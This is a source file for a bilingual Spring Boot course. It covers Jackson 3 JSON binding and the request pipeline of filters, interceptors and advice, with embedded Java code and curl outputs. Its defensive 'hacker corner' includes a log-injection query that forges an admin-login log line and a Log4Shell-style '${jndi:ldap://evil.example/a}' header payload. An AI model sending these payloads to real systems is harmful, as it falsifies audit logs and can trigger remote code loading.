  <li><strong>Body khổng lồ:</strong> chuỗi 30&nbsp;MB được nhận với 200. Mặc định cả Tomcat lẫn Jackson đều không chặn body JSON cỡ đó, và mỗi request đồng thời cỡ đó là 30&nbsp;MB heap. Bạn phải tự đặt giới hạn — bài 4.4 làm bằng một filter trả 413 trước khi Jackson đọc byte nào; reverse proxy (<code>client_max_body_size</code> của nginx) là lớp thứ hai.</li>
  <li><strong>Kiểu đa hình:</strong> <strong>CVE-2017-7525</strong> (CVSS 9,8) — thực thi mã từ xa khi ứng dụng để JSON tự chọn class Java nào được tạo ("default typing"). Hàng chục CVE sau đó tìm thêm các class "gadget" mới. Luật: không bao giờ bật default typing hay <code>@JsonTypeInfo(use = Id.CLASS)</code> cho đầu vào bạn không kiểm soát; đa hình thì dùng sealed interface với danh sách tên cố định (<code>Id.NAME</code>).</li>
</ul>

<h3>So với Node.js</h3>
${MA43_NODE}
${OUT43_NODE}
<p>Express nhận nguyên <code>"seats":"hai"</code> và chuỗi ngày giờ: không có kiểu nào để đổi sang, nên kiểm tra là việc của bạn (zod). Body <code>text/plain</code> đơn giản là không được đọc — <code>req.body</code> là <code>undefined</code>, không có 415. Ngược lại, <code>express.json()</code> có <strong>giới hạn 100&nbsp;KB mặc định</strong> và trả 413 — mặc định an toàn hơn của Spring, vì thế bản Spring cần filter ở bài sau.</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li><strong>"Đặt lúc 8 giờ, hiện 15 giờ"</strong> (minh hoạ): ứng dụng di động gửi giờ địa phương không kèm độ lệch, server lưu như thể UTC, trang web lại cộng thêm 7. Thống nhất trong hợp đồng: gửi ISO-8601 có độ lệch, lưu <code>timestamptz</code>, trả UTC dạng <code>Z</code>, client nào tự hiện theo múi giờ của nó.</li>
  <li><strong>Nâng Spring Boot 3 ⇒ 4:</strong> serializer tự viết và cấu hình <code>ObjectMapper</code> phải chuyển sang <code>tools.jackson</code>; và request nào trước nhận <code>0</code> khi thiếu số thì giờ nhận 400. Chạy bộ test API trước khi ăn mừng.</li>
  <li><strong>Lỗi 400 không ai hiểu:</strong> client chỉ thấy "Bad Request". Đọc dòng WARN (nó nêu tên trường và kiểu), rồi trả body lỗi có ích — Chương 5.</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Spring biến JSON thành đối tượng thế nào?"</strong> — <code>@RequestBody</code> ⇒ một <code>HttpMessageConverter</code> chọn theo <code>Content-Type</code> ⇒ <code>JsonMapper</code> của Jackson đọc thành kiểu của tham số; response được chọn theo <code>Accept</code> (content negotiation).</li>
  <li><strong>"415, 406, 400 khác nhau thế nào?"</strong> — Server không đọc được định dạng request / không sinh được định dạng nào client nhận / hiểu định dạng nhưng nội dung sai.</li>
  <li><strong>"LocalDateTime hay Instant trong API?"</strong> — Instant (hoặc OffsetDateTime cho đầu vào) cho thời điểm; LocalDateTime chỉ cho giờ trên mặt đồng hồ. Lưu <code>timestamptz</code>. Container chạy UTC.</li>
  <li><strong>"Jackson 3 thay đổi gì?"</strong> — Package <code>tools.jackson</code> (annotation giữ nguyên), <code>JsonMapper</code> bất biến, exception unchecked, ngày giờ ISO mặc định, thuộc tính xếp theo chữ cái, thiếu kiểu nguyên thuỷ thì lỗi, java.time có sẵn.</li>
  <li><strong>"Bảo vệ một endpoint JSON khỏi bị lạm dụng thế nào?"</strong> — Giới hạn cỡ body (filter/proxy), giới hạn độ lồng của bộ đọc, không dùng default typing đa hình, DTO chỉ có các trường mong đợi, kiểm tra dữ liệu (Chương 5).</li>
</ol>

<h3>🧪 Thực hành (15 phút)</h3>
<div class="callout ok"><ol>
  <li>Sửa request đặt lịch để client <strong>bắt buộc</strong> gửi độ lệch múi giờ kèm <code>startAt</code> (giá trị thiếu độ lệch ⇒ 400).</li>
  <li>Trả <code>startAt</code> dạng <code>Instant</code> UTC, kèm một trường hiện giờ địa phương ở Việt Nam.</li>
</ol>
<p><strong>Đạt khi:</strong> <code>08:00+07:00</code> và <code>01:00Z</code> cho cùng một response, còn <code>08:00</code> không độ lệch cho 400.</p></div>
${giai('Xem một lời giải', `${MA43_GIAI}
${OUT43_GIAI}`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">HttpMessageConverter</span><span class="v">Đọc body request thành đối tượng / ghi đối tượng thành body response cho một kiểu media.</span></div>
  <div class="kv"><span class="k">Content-Type / Accept</span><span class="v">Kiểu media của body gửi đi / các kiểu media client đọc được khi nhận về.</span></div>
  <div class="kv"><span class="k">Content negotiation</span><span class="v">Chọn định dạng response từ <code>Accept</code> và các bộ chuyển đổi đang có.</span></div>
  <div class="kv"><span class="k">JsonMapper</span><span class="v">Bộ ánh xạ JSON bất biến của Jackson 3; Spring Boot cung cấp nó dưới dạng bean.</span></div>
  <div class="kv"><span class="k">ISO-8601</span><span class="v">Định dạng chữ cho ngày giờ <code>2026-11-20T01:00:00Z</code>, <code>…+07:00</code>.</span></div>
  <div class="kv"><span class="k">StreamReadConstraints</span><span class="v">Giới hạn của Jackson về độ lồng, độ dài chuỗi và độ dài số khi đọc.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Content-Type chọn bộ đọc (không có thì 415), Accept chọn bộ ghi (không có thì 406), nội dung sai là 400 — và log WARN nêu đúng lý do.</li>
  <li>Jackson 3 trong Boot 4: package mới, ngày giờ ISO, thuộc tính bean xếp theo chữ cái, thiếu kiểu nguyên thuỷ thì lỗi, trường lạ bị bỏ qua.</li>
  <li>Dùng Instant/OffsetDateTime cho thời điểm; LocalDateTime đổi nghĩa theo múi giờ của server.</li>
  <li>Độ lồng đã được giới hạn sẵn; cỡ body thì chưa — hãy tự thêm giới hạn.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://github.com/FasterXML/jackson/blob/main/jackson3/MIGRATING_TO_JACKSON_3.md', '🐙', 'Migrating to Jackson 3', 'Danh sách chính thức các package đổi tên và mặc định đã đổi.')}
${tl('https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/requestbody.html', '🌱', 'Spring Framework — @RequestBody', 'Bộ chuyển đổi thông điệp, kiểm tra dữ liệu và cách lỗi được ném ra.')}

<h3>Nguồn</h3>
<ul>
  <li>Output ở trên: JsonApp và GiaiApp trên Spring Boot 4.1.2, Jackson 3.1.7 (+ jackson-dataformat-xml 3.1.7), Temurin 21.0.12.1, múi giờ server Asia/Ho_Chi_Minh và UTC; Express 5.3.0 trên Node 22.22.2 (19/11/2026).</li>
  <li>NVD: <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-42003" target="_blank" rel="noopener">CVE-2022-42003</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-42004" target="_blank" rel="noopener">CVE-2022-42004</a> (02/10/2022), <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7525" target="_blank" rel="noopener">CVE-2017-7525</a>.</li>
</ul>
</div>
`;

// ===== Bài 4.4 =====
const MA44_FILTER = java("/** Filter: chạy ở tầng Servlet, TRƯỚC DispatcherServlet — thấy mọi request, kể cả request không có controller. */\n@Component\n@Order(Ordered.HIGHEST_PRECEDENCE)\npublic class RequestIdFilter extends OncePerRequestFilter {\n    private static final Logger log = LoggerFactory.getLogger(RequestIdFilter.class);\n    private static final Pattern SAFE = Pattern.compile(\"[A-Za-z0-9-]{8,64}\");\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain)\n            throws ServletException, IOException {\n        String rid = req.getHeader(\"X-Request-Id\");\n        if (rid == null || !SAFE.matcher(rid).matches()) rid = UUID.randomUUID().toString().substring(0, 8); // không tin header lạ\n        MDC.put(\"rid\", rid);                                   // mọi dòng log trong request này mang rid\n        res.setHeader(\"X-Request-Id\", rid);\n        long t0 = System.nanoTime();\n        log.info(\"[filter] → {} {}\", req.getMethod(), req.getRequestURI());\n        try {\n            chain.doFilter(req, res);                          // đi tiếp: filter sau ⇒ DispatcherServlet ⇒ controller\n        } finally {\n            log.info(\"[filter] ← {} {} ms\", res.getStatus(), (System.nanoTime() - t0) / 1_000_000);\n            MDC.remove(\"rid\");                                 // luồng Tomcat được dùng lại cho request khác!\n        }\n    }\n}");
const MA44_LIMIT = java("/** Chặn body quá lớn TRƯỚC khi Jackson đọc (bài 4.3: Spring nhận cả chuỗi 30 MB). */\n@Component\n@Order(1)\npublic class BodyLimitFilter extends OncePerRequestFilter {\n    private static final long MAX = 1_000_000;                 // 1 MB\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain)\n            throws ServletException, IOException {\n        if (req.getContentLengthLong() > MAX) {\n            res.sendError(413, \"body too large\");              // dừng luôn: không gọi chain.doFilter\n            return;\n        }\n        chain.doFilter(req, res);\n    }\n}");
const MA44_INTER = java("/** Interceptor: chạy BÊN TRONG DispatcherServlet, đã biết hàm controller nào sẽ xử lý. */\n@Component\npublic class TimingInterceptor implements HandlerInterceptor {\n    private static final Logger log = LoggerFactory.getLogger(TimingInterceptor.class);\n\n    @Override\n    public boolean preHandle(HttpServletRequest req, HttpServletResponse res, Object handler) {\n        String name = handler instanceof HandlerMethod hm\n                ? hm.getBeanType().getSimpleName() + \".\" + hm.getMethod().getName() : handler.getClass().getSimpleName();\n        log.info(\"[interceptor] preHandle → {}\", name);\n        return true;                                           // false = dừng tại đây, không gọi controller\n    }\n\n    @Override\n    public void postHandle(HttpServletRequest req, HttpServletResponse res, Object handler, ModelAndView mv) {\n        log.info(\"[interceptor] postHandle\");                  // KHÔNG chạy nếu controller ném exception\n    }\n\n    @Override\n    public void afterCompletion(HttpServletRequest req, HttpServletResponse res, Object handler, Exception ex) {\n        log.info(\"[interceptor] afterCompletion ex={}\", ex == null ? \"-\" : ex.getClass().getSimpleName());\n    }\n}");
const MA44_CONFIG = java("@Configuration\npublic class WebConfig implements WebMvcConfigurer {\n    private final TimingInterceptor timing;\n\n    WebConfig(TimingInterceptor timing) { this.timing = timing; }\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        registry.addInterceptor(timing).addPathPatterns(\"/**\");   // interceptor phải đăng ký, @Component chưa đủ\n    }\n}");
const MA44_ADVICE = java("/** @RestControllerAdvice: bắt exception ném ra từ controller (Chương 5 nâng cấp thành ProblemDetail). */\n@RestControllerAdvice\npublic class ApiAdvice {\n    private static final Logger log = LoggerFactory.getLogger(ApiAdvice.class);\n\n    @ExceptionHandler(IllegalStateException.class)\n    public ResponseEntity<Map<String, String>> conflict(IllegalStateException e) {\n        log.info(\"[advice] {} ⇒ 409\", e.getMessage());\n        return ResponseEntity.status(409).body(Map.of(\"error\", e.getMessage()));\n    }\n}");
const MA44_CTRL = java("@RestController\npublic class LabController {\n    private static final Logger log = LoggerFactory.getLogger(LabController.class);\n\n    @GetMapping(\"/labs\")\n    public List<String> labs() {\n        log.info(\"[controller] labs() trên luồng {}\", Thread.currentThread().getName());\n        return List.of(\"AI-01\", \"IOT-02\");\n    }\n\n    @PostMapping(\"/bookings\")\n    public String book(@RequestBody String body) {\n        log.info(\"[controller] book()\");\n        throw new IllegalStateException(\"lab AI-01 đã kín giờ này\");\n    }\n\n    @GetMapping(\"/labs/search\")\n    public List<String> search(@RequestParam String q) {\n        log.info(\"tìm lab q={}\", q);                           // ghi thẳng dữ liệu người dùng vào log\n        return List.of();\n    }\n\n    @GetMapping(\"/trace\")\n    public List<String> trace() {                              // ai đã gọi tới hàm này? in ngăn xếp gọi thật\n        return Arrays.stream(Thread.currentThread().getStackTrace())\n                .map(f -> f.getClassName().replaceAll(\"^.*\\\\.\", \"\") + \".\" + f.getMethodName())\n                .filter(s -> s.matches(\"(?i).*(filter|dispatch|servlet|handle|invoke|controller|labs|trace|valve|processor|thread).*\"))\n                .toList();\n    }\n}");
const OUT44_OK = out("# app chạy với logging.pattern.console=%-5level [%15.15thread] [rid=%X{rid:-}] %logger{0}: %msg%n\n$ curl -i localhost:8080/labs -H 'X-Request-Id: req-an-0001'\nHTTP/1.1 200 \nX-Request-Id: req-an-0001\nContent-Type: application/json\nContent-Length: 18\n\n[\"AI-01\",\"IOT-02\"]\n# log:\nINFO  [nio-8080-exec-7] [rid=req-an-0001] RequestIdFilter: [filter] → GET /labs\nINFO  [nio-8080-exec-7] [rid=req-an-0001] TimingInterceptor: [interceptor] preHandle → LabController.labs\nINFO  [nio-8080-exec-7] [rid=req-an-0001] LabController: [controller] labs() trên luồng http-nio-8080-exec-7\nINFO  [nio-8080-exec-7] [rid=req-an-0001] TimingInterceptor: [interceptor] postHandle\nINFO  [nio-8080-exec-7] [rid=req-an-0001] TimingInterceptor: [interceptor] afterCompletion ex=-\nINFO  [nio-8080-exec-7] [rid=req-an-0001] RequestIdFilter: [filter] ← 200 1 ms");
const OUT44_ADVICE = out("$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"lab\":\"AI-01\"}'\n{\"error\":\"lab AI-01 đã kín giờ này\"}\n# log:\nINFO  [nio-8080-exec-9] [rid=c8baf0d7] RequestIdFilter: [filter] → POST /bookings\nINFO  [nio-8080-exec-9] [rid=c8baf0d7] TimingInterceptor: [interceptor] preHandle → LabController.book\nINFO  [nio-8080-exec-9] [rid=c8baf0d7] LabController: [controller] book()\nINFO  [nio-8080-exec-9] [rid=c8baf0d7] ApiAdvice: [advice] lab AI-01 đã kín giờ này ⇒ 409\nINFO  [nio-8080-exec-9] [rid=c8baf0d7] TimingInterceptor: [interceptor] afterCompletion ex=-\nINFO  [nio-8080-exec-9] [rid=c8baf0d7] RequestIdFilter: [filter] ← 409 2 ms");
const OUT44_404 = out("$ curl localhost:8080/khong-co\n{\"timestamp\":\"2026-11-18T17:47:56.223Z\",\"status\":404,\"error\":\"Not Found\",\"path\":\"/khong-co\"}\n# log:\nINFO  [nio-8080-exec-1] [rid=ce3e527d] RequestIdFilter: [filter] → GET /khong-co\nINFO  [nio-8080-exec-1] [rid=ce3e527d] TimingInterceptor: [interceptor] preHandle → ResourceHttpRequestHandler\nINFO  [nio-8080-exec-1] [rid=ce3e527d] TimingInterceptor: [interceptor] afterCompletion ex=-\nINFO  [nio-8080-exec-1] [rid=ce3e527d] RequestIdFilter: [filter] ← 404 1 ms\nINFO  [nio-8080-exec-1] [rid=] TimingInterceptor: [interceptor] preHandle → BasicErrorController.error\nINFO  [nio-8080-exec-1] [rid=] TimingInterceptor: [interceptor] postHandle\nINFO  [nio-8080-exec-1] [rid=] TimingInterceptor: [interceptor] afterCompletion ex=-");
const OUT44_TRACE = out("$ curl localhost:8080/trace\n   Thread.getStackTrace\n   LabController.trace\n   DirectMethodHandleAccessor.invoke\n   Method.invoke\n   InvocableHandlerMethod.doInvoke\n   InvocableHandlerMethod.invokeForRequest\n   ServletInvocableHandlerMethod.invokeAndHandle\n   RequestMappingHandlerAdapter.invokeHandlerMethod\n   RequestMappingHandlerAdapter.handleInternal\n   AbstractHandlerMethodAdapter.handle\n   DispatcherServlet.doDispatch\n   DispatcherServlet.doService\n   FrameworkServlet.processRequest\n   FrameworkServlet.doGet\n   HttpServlet.service\n   FrameworkServlet.service\n   HttpServlet.service\n   ApplicationFilterChain.doFilter\n   WsFilter.doFilter\n   ApplicationFilterChain.doFilter\n   BodyLimitFilter.doFilterInternal\n   OncePerRequestFilter.doFilter\n   ApplicationFilterChain.doFilter\n   RequestContextFilter.doFilterInternal\n   OncePerRequestFilter.doFilter\n   ApplicationFilterChain.doFilter\n   FormContentFilter.doFilterInternal\n   OncePerRequestFilter.doFilter\n   ApplicationFilterChain.doFilter\n   CharacterEncodingFilter.doFilterInternal\n   OncePerRequestFilter.doFilter\n   ApplicationFilterChain.doFilter\n   RequestIdFilter.doFilterInternal\n   OncePerRequestFilter.doFilter\n   ApplicationFilterChain.doFilter\n   StandardWrapperValve.invoke\n   StandardContextValve.invoke\n   AuthenticatorBase.invoke\n   StandardHostValve.invoke\n   ErrorReportValve.invoke\n   StandardEngineValve.invoke\n   Http11Processor.service\n   AbstractProcessorLight.process\n   AbstractProtocol$ConnectionHandler.process\n   NioEndpoint$SocketProcessor.doRun\n   SocketProcessorBase.run\n   ThreadPoolExecutor.runWorker\n   ThreadPoolExecutor$Worker.run\n   TaskThread$WrappingRunnable.run\n   Thread.run");
const OUT44_BIG = out("$ curl -H 'Content-Type: application/json' --data-binary @/tmp/sbh/big.json -o /dev/null -w '%{http_code}\\n' localhost:8080/bookings\n413\n\n# log:\nINFO  [nio-8080-exec-5] [rid=3889f5e3] RequestIdFilter: [filter] → POST /bookings\nINFO  [nio-8080-exec-5] [rid=3889f5e3] RequestIdFilter: [filter] ← 413 0 ms\nINFO  [nio-8080-exec-5] [rid=] TimingInterceptor: [interceptor] preHandle → BasicErrorController.error\nINFO  [nio-8080-exec-5] [rid=] TimingInterceptor: [interceptor] postHandle\nINFO  [nio-8080-exec-5] [rid=] TimingInterceptor: [interceptor] afterCompletion ex=-");
const OUT44_VIRTUAL = out("# chạy lại với --spring.threads.virtual.enabled=true\n$ curl -i localhost:8080/labs -H 'X-Request-Id: req-an-0001'\nINFO  [omcat-handler-0] [rid=req-an-0001] LabController: [controller] labs() trên luồng tomcat-handler-0");
const OUT44_INJECT = out("$ curl 'localhost:8080/labs/search?q=AI%0AINFO%20%20%5Bnio-8080-exec-9%5D%20%5Brid%3Dreq-admin-01%5D%20AuthService%3A%20admin%20login%20OK%20user%3Dan%40fpt.edu.vn'\n[]\n# log:\nINFO  [nio-8080-exec-6] [rid=d3310f98] RequestIdFilter: [filter] → GET /labs/search\nINFO  [nio-8080-exec-6] [rid=d3310f98] TimingInterceptor: [interceptor] preHandle → LabController.search\nINFO  [nio-8080-exec-6] [rid=d3310f98] LabController: tìm lab q=AI\nINFO  [nio-8080-exec-9] [rid=req-admin-01] AuthService: admin login OK user=an@fpt.edu.vn\nINFO  [nio-8080-exec-6] [rid=d3310f98] TimingInterceptor: [interceptor] postHandle\nINFO  [nio-8080-exec-6] [rid=d3310f98] TimingInterceptor: [interceptor] afterCompletion ex=-\nINFO  [nio-8080-exec-6] [rid=d3310f98] RequestIdFilter: [filter] ← 200 3 ms");
const OUT44_ECS = out("# chạy lại với --logging.structured.format.console=ecs (log JSON có cấu trúc)\n$ curl 'localhost:8080/labs/search?q=AI%0AINFO%20%20%5Bnio-8080-exec-9%5D%20%5Brid%3Dreq-admin-01%5D%20AuthService%3A%20admin%20login%20OK%20user%3Dan%40fpt.edu.vn'\n{\"@timestamp\":\"2026-11-18T17:48:06.826553511Z\",\"log\":{\"level\":\"INFO\",\"logger\":\"com.cuongthai.c4.pipe.LabController\"},\"process\":{\"pid\":1,\"thread\":{\"name\":\"http-nio-8080-exec-1\"}},\"service\":{\"node\":{}},\"message\":\"tìm lab q=AI\\nINFO  [nio-8080-exec-9] [rid=req-a");
const OUT44_FAKEID = out("$ curl -i localhost:8080/labs -H 'X-Request-Id: ${jndi:ldap://evil.example/a}'\nHTTP/1.1 200 \nX-Request-Id: 878e142d\nContent-Type: application/json\nContent-Length: 18\n\n[\"AI-01\",\"IOT-02\"]\n# log:\nINFO  [nio-8080-exec-8] [rid=878e142d] RequestIdFilter: [filter] → GET /labs\nINFO  [nio-8080-exec-8] [rid=878e142d] TimingInterceptor: [interceptor] preHandle → LabController.labs\nINFO  [nio-8080-exec-8] [rid=878e142d] LabController: [controller] labs() trên luồng http-nio-8080-exec-8\nINFO  [nio-8080-exec-8] [rid=878e142d] TimingInterceptor: [interceptor] postHandle\nINFO  [nio-8080-exec-8] [rid=878e142d] TimingInterceptor: [interceptor] afterCompletion ex=-\nINFO  [nio-8080-exec-8] [rid=878e142d] RequestIdFilter: [filter] ← 200 7 ms");
const MA44_NODE = js("// pipe.mjs — đường đi request trong Express 5: chỉ có MỘT khái niệm \"middleware\", thứ tự = thứ tự app.use\nimport express from 'express';\nconst app = express();\napp.use((req, res, next) => { console.log('[mw1] →', req.method, req.url); res.on('finish', () => console.log('[mw1] ←', res.statusCode)); next(); });\napp.post('/bookings', (req, res) => { console.log('[route] book()'); throw new Error('lab AI-01 đã kín giờ này'); });\napp.use((err, req, res, next) => { console.log('[error mw]', err.message, '⇒ 409'); res.status(409).json({ error: err.message }); });\napp.listen(41861);");
const OUT44_NODE = out("$ curl -X POST localhost:3000/bookings\n{\"error\":\"lab AI-01 đã kín giờ này\"}\n# log:\n[mw1] → POST /bookings\n[route] book()\n[error mw] lab AI-01 đã kín giờ này ⇒ 409\n[mw1] ← 409");
const MA44_GIAI = java("/** Lời giải thực hành 4.4: WARN cho request chậm hơn 200 ms, ghi tên hàm controller. */\n@Component\npublic class SlowRequestInterceptor implements HandlerInterceptor {\n    private static final Logger log = LoggerFactory.getLogger(SlowRequestInterceptor.class);\n    private static final String START = SlowRequestInterceptor.class.getName() + \".start\";\n\n    @Override\n    public boolean preHandle(HttpServletRequest req, HttpServletResponse res, Object handler) {\n        req.setAttribute(START, System.nanoTime());          // thuộc tính của request: mỗi request một giá trị, an toàn đa luồng\n        return true;\n    }\n\n    @Override\n    public void afterCompletion(HttpServletRequest req, HttpServletResponse res, Object handler, Exception ex) {\n        long ms = (System.nanoTime() - (long) req.getAttribute(START)) / 1_000_000;\n        if (ms > 200 && handler instanceof HandlerMethod hm) {\n            log.warn(\"SLOW {} {} -> {}.{} took {} ms (status {})\", req.getMethod(), req.getRequestURI(),\n                    hm.getBeanType().getSimpleName(), hm.getMethod().getName(), ms, res.getStatus());\n        }\n    }\n}");
const OUT44_GIAI = out("$ curl localhost:8080/fast; curl localhost:8080/report\nok\nreport\n# log:\nWARN … SlowRequestInterceptor: SLOW GET /report -> ReportController.report took 351 ms (status 200)");

const L44_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.4</span>
<h2>The request pipeline: DispatcherServlet, filters and interceptors</h2>
<p class="lead">Between the network socket and your <code>@GetMapping</code> method there are about fifty Java method calls. Most of the time you do not care — until you need to do something for <em>every</em> request (a request ID in every log line, a size limit, timing, an access check) and must choose where to put it. Spring offers three places: a servlet <strong>Filter</strong>, a Spring MVC <strong>HandlerInterceptor</strong> and a <strong>@ControllerAdvice</strong>. We put one of each into a running app, print the real call stack from Tomcat to the controller, watch what each layer sees on a normal request, an exception and a 404, then use the pipeline to forge a log line — the same class of attack as Log4Shell — and fix it.</p>

<h3>In everyday life first</h3>
<p>A parcel to the Alpha building passes: the <strong>security gate</strong> at the entrance (sees every parcel, even ones for rooms that do not exist; can refuse oversized parcels; stamps a tracking number), then the <strong>floor receptionist</strong> (already knows which room and which person the parcel is for; can check that person's opening hours), then the <strong>person</strong> who handles it. If the person cannot handle it, the <strong>complaints desk</strong> writes the standard reply. Gate = filter, receptionist = interceptor, person = controller, complaints desk = <code>@ControllerAdvice</code>.</p>

<h3>The real call stack</h3>
<p>Instead of a diagram, ask the JVM. This endpoint returns its own stack trace (frames filtered to the interesting ones):</p>
${OUT44_TRACE}
<p>Read it from the bottom up:</p>
<ol>
  <li><strong>Tomcat</strong>: a worker thread from the pool (<code>ThreadPoolExecutor</code>, lesson 2.3) takes the socket (<code>NioEndpoint</code>), parses HTTP (<code>Http11Processor</code>), passes through Tomcat's valves (host, context, authentication, error report).</li>
  <li><strong>Servlet filter chain</strong> (<code>ApplicationFilterChain</code>): our <code>RequestIdFilter</code> first, then Spring Boot's <code>CharacterEncodingFilter</code>, <code>FormContentFilter</code>, <code>RequestContextFilter</code>, our <code>BodyLimitFilter</code>, Tomcat's <code>WsFilter</code>. Each filter calls <code>chain.doFilter</code> to pass the request on — the stack is nested, so each filter also runs again <em>after</em> everything inside it finishes.</li>
  <li><strong>DispatcherServlet</strong>: the single servlet of Spring MVC. <code>doDispatch</code> looks up the handler in the mapping table (lesson 4.1), runs interceptors, calls the <code>HandlerAdapter</code>.</li>
  <li><strong>HandlerAdapter</strong> resolves arguments (<code>@PathVariable</code>, <code>@RequestBody</code> through converters — lesson 4.3) and invokes your method by reflection (<code>Method.invoke</code>).</li>
</ol>
<p>One thread does all of it, from socket to controller and back. That is why a slow controller holds a Tomcat thread (lesson 2.5), and why per-request data can live in a <code>ThreadLocal</code> such as the logging MDC — as long as you clean it up.</p>

<h3>The three components</h3>
${MA44_FILTER}
${MA44_LIMIT}
${MA44_INTER}
${MA44_CONFIG}
${MA44_ADVICE}
${MA44_CTRL}

<h3>Request 1: everything works</h3>
${OUT44_OK}
<p>The order is: filter in → interceptor <code>preHandle</code> (already knows the handler is <code>LabController.labs</code>) → controller → <code>postHandle</code> → <code>afterCompletion</code> → filter out with status and duration. Every line carries <code>rid=req-an-0001</code> because the filter put it in the MDC — when a user reports a problem, search the logs for the ID from the response header and you get exactly their request, even with hundreds of requests interleaved.</p>

<h3>Request 2: the controller throws</h3>
${OUT44_ADVICE}
<p><code>postHandle</code> did <strong>not</strong> run — it only runs after a successful handler. The advice turned the exception into a 409 inside the DispatcherServlet, so <code>afterCompletion</code> sees <code>ex=-</code> (the exception was handled) and the filter sees a normal 409 response. Put "always" work (timing, cleanup) in <code>afterCompletion</code> or in the filter's <code>finally</code>, never in <code>postHandle</code>.</p>

<h3>Request 3: no controller at all</h3>
${OUT44_404}
<p>Three things to learn from four lines. The interceptor ran with handler <code>ResourceHttpRequestHandler</code> — Spring tried to serve a static file named <code>khong-co</code>. The filter finished with 404 and removed the request ID. Then Tomcat forwarded the request to <code>/error</code> (an <em>ERROR dispatch</em>) to build the JSON body; <code>OncePerRequestFilter</code> skips error dispatches by default, so those lines have an empty <code>rid</code>. If you need the ID in error handling too, keep it in a request attribute or override <code>shouldNotFilterErrorDispatch()</code>.</p>

<h3>Which one when?</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Filter (servlet)</span><span class="v">Sees every request, including static files, 404s, requests Spring MVC never handles. Can wrap or replace the request/response, refuse early. Knows nothing about controllers. Use for: request ID + MDC, body size limits, CORS, compression, security (<strong>Spring Security is a filter chain</strong> — Chapter 9).</span></div>
  <div class="kv"><span class="k">HandlerInterceptor (Spring MVC)</span><span class="v">Runs inside DispatcherServlet, after the handler is chosen: knows the controller method and its annotations. Use for: per-endpoint timing, audit by handler, simple checks driven by annotations.</span></div>
  <div class="kv"><span class="k">@ControllerAdvice / @RestControllerAdvice</span><span class="v">Turns exceptions into responses for all controllers; can also pre-process bodies. Use for: consistent error format (Chapter 5).</span></div>
  <div class="kv"><span class="k">Aspect (lesson 3.5)</span><span class="v">Wraps bean methods, not HTTP: works the same whether the service is called from a controller, a scheduled job or a test.</span></div>
</div>

<h3>The body limit from lesson 4.3</h3>
${OUT44_BIG}
<p>The 30&nbsp;MB body that Jackson accepted in lesson 4.3 is now refused with 413 in 0 ms, before a single byte is parsed — the filter stops the chain by not calling <code>chain.doFilter</code>. (A client can lie or omit <code>Content-Length</code> with chunked encoding; for full protection also cap the stream or let the reverse proxy enforce a limit.)</p>

<h3>Threads: the same pipeline on virtual threads</h3>
${OUT44_VIRTUAL}
<p>With <code>spring.threads.virtual.enabled=true</code> (lesson 2.5) Tomcat runs each request on a virtual thread (<code>tomcat-handler-0</code> instead of <code>http-nio-8080-exec-1</code>). The pipeline is identical; the MDC still works because each request still runs on one thread from start to finish.</p>

<h3>🕵️ Hacker corner — forging log lines</h3>
<p>The search endpoint logs the user's query: <code>log.info("tìm lab q={}", q)</code>. Looks harmless. The attacker sends a query containing a newline (<code>%0A</code>) followed by text formatted like a log line:</p>
${OUT44_INJECT}
<p>The fourth log line was written by the attacker. It has the right format, a believable thread name, a request ID — and it says the admin logged in. Whoever investigates an incident later reads a false story; a monitoring rule that counts "admin login OK" is fooled. This is <strong>log injection</strong> (CWE-117). Logback, like most text loggers, writes the message as it is.</p>
<div class="callout warn"><p><strong>Real incident — Log4Shell, CVE-2021-44228 (published 10 December 2021, CVSS 10).</strong> The same root cause taken to the extreme: Apache Log4j 2 evaluated <code>\${jndi:ldap://…}</code> lookups inside <em>logged</em> messages, so any attacker-controlled string that reached a log line — a User-Agent header, a username, a chat message — could make the server load and run code from the attacker's server. It affected an enormous number of Java applications and products; the advice was simply "anything a user sends will eventually be logged". Spring Boot's default logger is Logback, not Log4j 2 core, which is why Boot apps on defaults were not directly exploitable — Section 0 ("Start here", part 2) showed <code>log4j-api</code> but no <code>log4j-core</code> in the jar.</p>
<p><strong>How to prevent it:</strong> log structured data instead of concatenated text; never trust IDs and headers from clients (our filter only accepts <code>[A-Za-z0-9-]{8,64}</code>); keep logging libraries patched; don't log secrets at all.</p></div>
<p>Two of those defences, running. First the filter rejecting a hostile request ID:</p>
${OUT44_FAKEID}
<p>The client's value failed the pattern, so the server generated its own ID — nothing the attacker wrote reached the log. Second, Spring Boot's built-in <strong>structured logging</strong> (one property) writes every line as JSON, where the newline becomes the two characters <code>\\n</code> inside a string and cannot start a new record:</p>
${OUT44_ECS}

<h3>Compared with Express</h3>
${MA44_NODE}
${OUT44_NODE}
<p>Express has one concept — middleware, run in registration order, with an error middleware (four arguments) as the equivalent of <code>@ControllerAdvice</code>. Spring splits the same idea into layers that know different things: a filter knows only HTTP, an interceptor also knows the handler method, an advice knows the exception type. Interview line: "a Spring filter is like an Express middleware registered before the router; an interceptor is like middleware attached to the matched route."</p>

<h3>In real life and at work</h3>
<ul>
  <li><strong>"Customer says booking failed at 10:42"</strong>: with a request ID in the response header and in every log line, support asks the customer (or the front-end error screen shows) the ID, and you find the exact request in seconds. Pass the same ID to downstream calls (Chapter 15 does it with tracing).</li>
  <li><strong>Where did my header go?</strong> If a filter registered by a library runs before yours and reads the body, your controller sees an empty body — order filters explicitly with <code>@Order</code>, and print the chain (the stack trace trick above) when in doubt.</li>
  <li><strong>Security review:</strong> grep for <code>log.*(request|getParameter|getHeader)</code>; every hit is a place where user input reaches the log.</li>
</ul>

